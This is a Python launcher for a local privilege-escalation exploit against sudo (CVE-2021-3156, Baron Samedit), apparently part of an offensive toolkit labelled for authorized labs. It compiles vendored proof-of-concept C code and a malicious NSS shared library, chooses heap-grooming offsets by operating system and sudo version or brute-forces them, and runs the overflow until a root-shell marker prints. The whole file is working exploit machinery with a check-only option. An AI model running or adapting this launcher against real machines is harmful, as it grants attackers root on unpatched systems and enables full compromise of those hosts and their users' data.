#!/usr/bin/env python3
"""CVE-2021-3156 (Baron Samedit) - authorized-lab local privilege escalation deploy.

Compiles the vendored blasty PoC pair (weapons/poc/src/CVE-2021-3156/
baron_samedit.c + lib.c) with cc on Linux, auto-selects a heap-grooming
target from /etc/os-release and the installed sudo version, and fires the
sudo heap overflow until the NSS payload prints its root-shell marker. On
non-Linux platforms, or when cc/sudoedit are absent, the launcher returns a
clean check-only result instead of firing.
"""
import argparse
import json
import os
import platform
import shutil
import subprocess
import sys
import tempfile

CVE = "CVE-2021-3156"
PAYLOAD_DIR = os.path.dirname(os.path.abspath(__file__))
REPO_ROOT = os.path.dirname(os.path.dirname(PAYLOAD_DIR))
POC_DIR = os.path.join(REPO_ROOT, "weapons", "poc", "src", CVE)
NSS_SO = os.path.join("libnss_X", "P0P_SH3LLZ_ .so.2")

TARGETS = [
    {"name": "Ubuntu 18.04.5 - sudo 1.8.21, libc-2.27", "a": 56, "b": 54, "nulls": 63, "lc": 212},
    {"name": "Ubuntu 20.04.1 - sudo 1.8.31, libc-2.31", "a": 56, "b": 54, "nulls": 63, "lc": 212},
    {"name": "Debian 10.0 - sudo 1.8.27, libc-2.28", "a": 64, "b": 49, "nulls": 60, "lc": 214},
]

OS_HINTS = [
    ("18.04", 0), ("bionic", 0),
    ("20.04", 1), ("focal", 1),
    ("debian gnu/linux 10", 2), ("buster", 2),
]


def _which_cc():
    for name in ("cc", "gcc", "clang"):
        path = shutil.which(name)
        if path:
            return path
    return None


def _sudo_version():
    for tool in ("sudoedit", "sudo"):
        path = shutil.which(tool)
        if not path:
            continue
        try:
            r = subprocess.run([path, "--version"], capture_output=True,
                               text=True, timeout=10)
            first = (r.stdout or r.stderr or "").splitlines()
            if first:
                return first[0].strip()
        except Exception:
            pass
    return None


def _os_release():
    try:
        with open("/etc/os-release", "r", encoding="utf-8", errors="replace") as fh:
            return fh.read().lower()
    except OSError:
        return ""


def _pick_targets(osrel, sudo_ver):
    """Order the target table: OS hints first, then everything else."""
    hinted = []
    for hint, idx in OS_HINTS:
        if hint in osrel and TARGETS[idx] not in hinted:
            hinted.append(TARGETS[idx])
    if sudo_ver and "1.8.2" in sudo_ver and TARGETS[2] not in hinted:
        # sudo 1.8.2x family matches the Debian 10 layout closely
        hinted.append(TARGETS[2])
    rest = [t for t in TARGETS if t not in hinted]
    return hinted + rest


def _build_stage(cc, stage):
    launcher = os.path.join(stage, "baron_samedit")
    r = subprocess.run([cc, os.path.join(POC_DIR, "baron_samedit.c"), "-o", launcher],
                      capture_output=True, text=True, timeout=60)
    if r.returncode != 0:
        return None, "launcher compile failed: %s" % (r.stderr or "")[:300]
    nss_dir = os.path.join(stage, "libnss_X")
    os.makedirs(nss_dir, exist_ok=True)
    nss_out = os.path.join(nss_dir, "P0P_SH3LLZ_ .so.2")
    r = subprocess.run([cc, "-fPIC", "-shared", "-o", nss_out,
                        os.path.join(POC_DIR, "lib.c")],
                       capture_output=True, text=True, timeout=60)
    if r.returncode != 0:
        return None, "NSS payload compile failed: %s" % (r.stderr or "")[:300]
    return launcher, None


def _fire(launcher, stage, params, timeout):
    argv = [launcher,
            str(params["a"]), str(params["b"]),
            str(params["nulls"]), str(params["lc"])]
    try:
        proc = subprocess.run(argv, cwd=stage, capture_output=True, text=True,
                             timeout=timeout, stdin=subprocess.DEVNULL)
    except subprocess.TimeoutExpired:
        return False, ""
    out = (proc.stdout or "") + (proc.stderr or "")
    return "bl1ng bl1ng" in out, out


def _brute_params(args):
    """Manual-mode parameter search space (brute.sh ranges)."""
    combos = []
    for smash in range(args.brute_smash_min, args.brute_smash_max + 1):
        for nulls in range(args.brute_null_min, args.brute_null_max + 1):
            for lc in range(args.brute_lc_min, args.brute_lc_max + 1, 10):
                if smash % 2:
                    a = (smash - 1) // 2
                    b = a + 1
                else:
                    a = smash // 2
                    b = a
                combos.append({"a": a, "b": b, "nulls": nulls, "lc": lc})
    return combos


def run(args):
    result = {
        "cve": CVE,
        "target": "local",
        "vulnerable": False,
        "verified_by": None,
        "os": _os_release().split("pretty_name=")[-1].strip('"')[:80] or None,
        "sudo_version": None,
        "compiled": False,
        "attempts": 0,
        "last_output": "",
        "error": None,
    }
    if not sys.platform.startswith("linux"):
        result["error"] = "check-only: not Linux (kernel %s)" % platform.release()
        return result
    if hasattr(os, "geteuid") and os.geteuid() == 0:
        result["error"] = "already root"
        result["vulnerable"] = None
        return result
    if shutil.which("sudoedit") is None:
        result["error"] = "check-only: sudoedit not on PATH"
        return result
    cc = _which_cc()
    if cc is None:
        result["error"] = "check-only: no cc/gcc/clang on PATH"
        return result
    if not os.path.isfile(os.path.join(POC_DIR, "baron_samedit.c")) or \
       not os.path.isfile(os.path.join(POC_DIR, "lib.c")):
        result["error"] = "poc sources missing under %s" % POC_DIR
        return result

    result["sudo_version"] = _sudo_version()
    if args.check_only:
        result["error"] = "check-only requested"
        return result

    stage = tempfile.mkdtemp(prefix="samedit_")
    try:
        launcher, err = _build_stage(cc, stage)
        if launcher is None:
            result["error"] = err
            return result
        result["compiled"] = True

        attempts = []
        if args.brute:
            attempts.extend(_brute_params(args))
        else:
            attempts.extend(_pick_targets(_os_release(), result["sudo_version"]))

        for params in attempts:
            result["attempts"] += 1
            ok, out = _fire(launcher, stage, params, args.attempt_timeout)
            result["last_output"] = out[:2000]
            if ok:
                result["vulnerable"] = True
                result["verified_by"] = ("root payload executed (blasty NSS module "
                                         "constructor ran inside setuid sudoedit)")
                result["winning_params"] = params
                break
        return result
    finally:
        shutil.rmtree(stage, ignore_errors=True)


def main():
    p = argparse.ArgumentParser(description="CVE-2021-3156 Baron Samedit authorized-lab deploy")
    p.add_argument("--check-only", action="store_true",
                   help="report environment only; do not compile/fire")
    p.add_argument("--attempt-timeout", type=float, default=4.0,
                   help="per-attempt timeout (s)")
    p.add_argument("--brute", action="store_true",
                   help="manual-mode parameter search instead of the target table")
    p.add_argument("--brute-smash-min", type=int, default=90)
    p.add_argument("--brute-smash-max", type=int, default=120)
    p.add_argument("--brute-null-min", type=int, default=50)
    p.add_argument("--brute-null-max", type=int, default=70)
    p.add_argument("--brute-lc-min", type=int, default=150)
    p.add_argument("--brute-lc-max", type=int, default=300)
    args = p.parse_args()
    try:
        result = run(args)
    except Exception as exc:  # defensive: deploy must never crash the operator console
        result = {"cve": CVE, "target": "local", "vulnerable": False,
                  "error": "%s: %s" % (type(exc).__name__, exc)}
    print(json.dumps(result, indent=2))
    if result.get("vulnerable") is None:
        return 0
    return 0 if result.get("vulnerable") else 1


if __name__ == "__main__":
    sys.exit(main())
